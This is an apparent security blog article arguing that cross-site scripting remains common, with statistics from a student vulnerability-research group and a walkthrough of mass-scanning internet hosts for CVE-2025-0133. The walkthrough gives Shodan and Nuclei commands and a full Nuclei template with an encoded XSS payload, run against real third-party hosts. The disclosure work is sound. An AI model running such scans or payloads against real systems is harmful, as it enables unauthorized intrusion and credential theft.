---
title: XSS is not Dead - Hacktiba Pulse 07
description: Based on real-world findings from CVE-Hunters, this article shows why this classic vulnerability still deserves serious attention in today’s web applications.
date: 2025-07-07
weight: 99
translationKey: "article-xssnaoestamorto"
image: xss-is-not-dead.png
tags:
  - CVE-Hunters
  - XSS
  - Vulnerability Research
  - Web Application Security
  - Responsible Disclosure
  - Open Source Vulnerabilities
  - Security Tools for Pentesters
  - Bug Bounty Tools
  - Ethical Hacking
  - XSS Detection

categories:
  - Vulnerability Research
  - Open Source Security
  - Web Application Security
  - Pentest Tools
  - Ethical Hacking Projects
  - CVE Disclosure
  - Cybersecurity Education
  - Case Studies
---

## Introduction: "XSS? Still?"

<p style="text-align: justify;">In the middle of 2025, are we still talking about XSS? Yes, we still are. Even with the use of modern frameworks, intelligent WAFs and a plethora of articles explaining how to mitigate this threat, Cross-Site Scripting (XSS) is still present, sneaky, persistent and often overlooked.</p>

<p style="text-align: justify;">XSS is one of the first vulnerabilities covered in introductory courses on offensive security and web application penetration testing. With a simple payload, instructors demonstrate how trivial this flaw is to exploit, highlighting the danger and ease of its exploitation.</p>

<p style="text-align: justify;">XSS is one of the first vulnerabilities covered in introductory courses on offensive security and web application penetration testing. With a simple payload, instructors demonstrate how trivial this flaw is to exploit, highlighting the danger and ease of its exploitation.</p>

<p style="text-align: justify;">But what is XSS anyway? According to <b><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP</a></b>, Cross-Site Scripting attacks are a type of injection in which malicious scripts are inserted into vulnerable websites. These attacks occur when an attacker uses a web application to send malicious code, usually scripts executed in the browser, to another user. The flaws that make these attacks possible are quite common and arise whenever a web application incorporates user input into the generated output without carrying out appropriate validation or coding.</p>

<p style="text-align: justify;">Also according to <b><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP</a></b>, the victim's browser has no mechanism for distinguishing legitimate scripts from malicious ones. Thus, when it receives and executes the code, it trusts that it came from a secure source. As a result, the attacker can access cookies, session tokens and other sensitive information stored by the browser, as well as rewriting the content of the page or redirecting the user to malicious sites disguised as legitimate ones.</p>

![Simple example of an XSS payload to execute a message.](image.png)

## CVE-Hunters vs XSS

<p style="text-align: justify;">The <b><a href="https://github.com/Sec-Dojo-Cyber-House/cve-hunters" target="_blank">CVE-Hunters</a></b> group was created in November 2024 as a joint initiative between students and a teacher, with a clear objective: to identify vulnerabilities (CVEs) in open source projects. The proposal was to give students practical experience in searching for flaws in real environments, going beyond controlled labs or Capture The Flag (CTF) challenges.</p>

<p style="text-align: justify;">Since then, the group has analyzed a wide range of projects, from small community systems to applications widely used in the public and educational sectors. Along the way, one pattern has stood out: the frequency with which <b>Cross-Site Scripting (XSS)</b> vulnerabilities have been found.</p>

<p style="text-align: justify;">This recurrence raises an important question: have developers stopped treating XSS seriously enough? Despite being a widely documented and known flaw for years, it still appears frequently. Even in organizations with mature development processes, XSS vulnerabilities continue to appear due to the complexity of input and output flows, the use of legacy libraries or the lack of contextualized testing.</p>

<p style="text-align: justify;">Currently, the group has <b>135 reported vulnerabilities</b>, <b>53 of which have already been officially registered as CVEs</b>. Of the total number of vulnerabilities discovered, <b>104 are of the XSS type</b>, which represents a significant and worrying proportion.</p>

![Vulnerabilities types Found by CVE-Hunters](1.png)

<p style="text-align: justify;">62 occurrences of the stored type and 42 of the reflected type were identified, revealing a relatively even distribution.</p>

![Amount of Stored vs Reflected XSS](2.png)

<p style="text-align: justify;">This statistics alone reinforces the idea that XSS is still a real problem, often overlooked during development, and that it continues to deserve attention, both from the technical community and from developers responsible for applications in production.</p>

## **Practical experience**

<p style="text-align: justify;">You may now be thinking: "OK, the <b><a href="https://github.com/Sec-Dojo-Cyber-House/cve-hunters" target="_blank">CVE-Hunters</a></b> group has found a lot of XSS in open source projects, but who's to say that large companies are also vulnerable?"</p>

<p style="text-align: justify;">Let's do a quick experiment, with one of the most recent XSS disclosed during the writing of this article: <b><a href="https://security.paloaltonetworks.com/CVE-2025-0133" target="_blank">CVE-2025-0133</a>.</b> An XSS reflected in the GlobalProtect gateway and portal products, features of Palo Alto Networks' PAN-OS, published on May 14, 2025.</p>

<p style="text-align: justify;">With a simple query on Shodan, we can check the estimated amount of use of this product in the world.</p>

![Shodan's search for pages with Global Protect](image-1.png)

<p style="text-align: justify;">However, this doesn't mean that everyone is vulnerable. Let's go through the experiment for this article.</p>

<p style="text-align: justify;">First, we extract some results from Shodan, a small sample of the total amount:</p>

```bash
shodan search --fields hostnames 'http.title:"GlobalProtect Portal" port:443' | grep -v '^$' > globalprotect-hostnames.txt
```

![Shodan CLI used to export pages with Global Protect](image-2.png)

<p style="text-align: justify;">After that, we can use <b><code>Nuclei</code></b> to test for this vulnerability and automate the test:</p>

```bash
nuclei -l globalprotect-hostnames.txt -t CVE-2025-0133.yaml
```

![Nuclei's results for CVE-2025-0133 template](image-3.png)

<p style="text-align: justify;">Template used for scanning: <b><a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/CVE-2025-0133.yaml" target="_blank">CVE-2025-0133</a></b>.</p>

```bash
id: CVE-2025-0133

info:
  name: PAN-OS - Reflected Cross-Site Scripting
  author: xbow,DhiyaneshDK
  severity: medium
  description: |
    A reflected cross-site scripting (XSS) vulnerability in the GlobalProtect™ gateway and portal features of Palo Alto Networks PAN-OS® software enables execution of malicious JavaScript in the context of an authenticated Captive Portal user's browser when they click on a specially crafted link.The primary risk is phishing attacks that can lead to credential theft—particularly if you enabled Clientless VPN.
  reference:
    - https://security.paloaltonetworks.com/CVE-2025-0133
    - https://hackerone.com/reports/3096384
  classification:
    epss-score: 0.00102
    epss-percentile: 0.29276
  metadata:
    verified: true
    max-request: 1
    shodan-query:
      - http.favicon.hash:"-631559155"
      - cpe:"cpe:2.3:o:paloaltonetworks:pan-os"
    fofa-query: icon_hash="-631559155"
    product: pan-os
    vendor: paloaltonetworks
  tags: hackerone,cve,cve2025,xss,panos,global-protect

http:
  - raw:
      - |
        GET /ssl-vpn/getconfig.esp?client-type=1&protocol-version=p1&app-version=3.0.1-10&clientos=Linux&os-version=linux-64&hmac-algo=sha1%2Cmd5&enc-algo=aes-128-cbc%2Caes-256-cbc&authcookie=12cea70227d3aafbf25082fac1b6f51d&portal=us-vpn-gw-N&user=%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Eprompt%28%22XSS%22%29%3C%2Fscript%3E%3C%2Fsvg%3E&domain=%28empty_domain%29&computer=computer HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<script>prompt("XSS")</script>'
          - 'authentication cookie'
        condition: and

      - type: status
        status:
          - 200
# digest: 490a0046304402202037be3477c0e16d7bb7cfb9874bf1cb6894a1d8035d64115db72607a539a54502203a1dac9b97514abef71fdb6a73d681f64f788f43605f2235f1fbfd26f6ddac2c:922c64590222798bb761d5b6d8e72950
```

<p style="text-align: justify;">We obtained a significant number of vulnerable hosts. Next, we tried to identify, among these results, any hosts that had a public VDP, so that we could notify them of the vulnerability. This step is a bit complex to do manually, so we used artificial intelligence to cross-reference the domains extracted from <b><code>Shodan</code></b> with information available on the internet about companies that have bug bounty programs or open VDPs.</p>

<p style="text-align: justify;">During this research, we found only two domains with public VDPs - one a large private sector company, the other a government agency. Both are based in the United States: one with a VDP hosted on BugCrowd and the other with a private VDP, accessible via email.</p>

<p style="text-align: justify;">We reported both vulnerabilities to the companies responsibly.</p>

![POC of Reflected XSS on one of the identified targets](image-4.png)

![Responsible Disclosure via Bugcrowd](image-5.png)

<p style="text-align: justify;">It is important to note that the sample tested represents only a fraction of the systems exposed.</p>

## **More numbers**

<p style="text-align: justify;">If you're still not convinced by the amount of XSS we have out there, we can do another simple search in the <i>GitHub Advisory Database</i> where we get a return of over <b>31,611 XSS-related occurrences</b>.</p>

![XSS search on GitHub Advisory Database](image-6.png)

<p style="text-align: justify;">A search in the <b>CVE (Common Vulnerabilities and Exposures)</b> database also reveals a significant number of registered vulnerabilities related to XSS, demonstrating its recurrence in different systems, applications and contexts over the years.</p>

![XSS search on MITRE](image-7.png)

<p style="text-align: justify;">In addition, a search carried out on the <b>HackerOne</b> platform, widely recognized in the <i>Bug Bounty</i> ecosystem, results in a total of <b>2,225 public reports</b> involving Cross-Site Scripting vulnerabilities. This data reinforces not only the prevalence of XSS, but also the security community's continued interest in exploiting and reporting it, even in environments with high security standards.</p>

![XSS search on HackerOne](image-8.png)

## **What can you do with an XSS besides alert(1)?**

<p style="text-align: justify;">The famous alert(1) is often the first example used to demonstrate an XSS flaw.  However, the real impacts of this vulnerability go far beyond a simple alert window. Below, we list some classic and well-known malicious actions that can be carried out by an attacker when exploiting a Cross-Site Scripting flaw:</p>

<p style="text-align: justify;">
  <ul>
    <li><b>Cookie Theft</b>, (if the cookie is not protected with the HttpOnly flag);</li>
    <li><b>Session Hijacking</b>, assuming the victim's identity in authenticated applications;</li>
    <li><b>Keylogging</b>, capturing everything the user types on the compromised page;</li>
    <li><b>Malicious Redirects</b> to fake pages, with the aim of applying scams;</li>
    <li><b>Performing actions on behalf of the user</b>, such as sending messages, changing settings or deleting data;</li>
    <li><b>Remote Code Execution</b>, although rare and depending on the specific context, it may be possible to gain remote access to the system from an XSS.</li>
  </ul>
</p>

<p style="text-align: justify;">These examples show that even though XSS is an often underestimated vulnerability, it can have serious consequences, especially when exploited in applications with sensitive data or with a high level of privilege for the affected user.</p>

## **Conclusion**

<p style="text-align: justify;">XSS is not dead, perhaps it has just been ignored in the face of new, more 'glamorous' threats. But its silent presence continues to offer an exploitable attack surface, often with critical impact.</p>

<p style="text-align: justify;">Despite often being classified as a vulnerability of <i>medium</i> or even <i>low</i> severity, <b>XSS should not be underestimated</b>. <b>Its impact can be significant, especially when it involves stealing cookies, session hijacking or redirecting to malicious pages. And what's more dangerous: traditional protections are not always enough to prevent the user from being tricked into clicking on that phishing site that is using a legitimate URL with an XSS vulnerability</b>.</p>

<p style="text-align: justify;">After all, XSS often depends on a single click, and in this scenario, <b>the weakest link is usually the user themselves</b>. It doesn't matter how robust your framework is or how well configured your WAF is: if the attacker manages to create a convincing malicious link, all it takes is one inattentive action by the victim for the attack to materialize.</p>

<p style="text-align: justify;"><b>While we rely on frameworks and WAFs, the attacker relies on our carelessness and the user's curiosity.</b></p>

Despite often being classified as a vulnerability of *medium* or even *low* severity, **XSS should not be underestimated**. Its impact can be significant, especially when it involves stealing cookies, session hijacking or redirecting to malicious pages. And what's more dangerous: **traditional protections are not always enough to prevent the user from being tricked into clicking on that phishing site that is using a legitimate URL with an XSS vulnerability.**

After all, XSS often depends on a single click, and in this scenario, **the weakest link is usually the user themselves**. It doesn't matter how robust your framework is or how well configured your WAF is: if the attacker manages to create a convincing malicious link, all it takes is one inattentive action by the victim for the attack to materialize.

**While we rely on frameworks and WAFs, the attacker relies on our carelessness and the user's curiosity.**

![](xss-is-not-dead.png)

## Written by

[![](/assets/contributors/50x50/natan50x50.png)](https://www.linkedin.com/in/nmmorette) [Natan Maia Morette](https://www.linkedin.com/in/nmmorette) 

## Contributor

This post was made in partnership with [Hacktiba](https://hacktiba.github.io/) for Pulse 07.

![Hacktiba](hacktiba.png)

> *Por: [CVE-Hunters](https://github.com/Sec-Dojo-Cyber-House/cve-hunters)*


